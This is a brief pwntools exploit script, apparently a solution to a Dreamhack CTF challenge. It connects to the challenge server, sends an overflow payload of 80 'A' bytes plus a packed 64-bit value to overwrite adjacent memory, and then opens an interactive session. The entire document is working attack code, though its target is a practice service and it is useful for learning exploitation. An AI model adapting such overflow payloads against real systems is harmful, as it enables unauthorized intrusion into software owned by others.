from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 14261
r = remote(HOST, PORT)

r.sendlineafter(b': ', b'A'*80+p64(1))

r.interactive()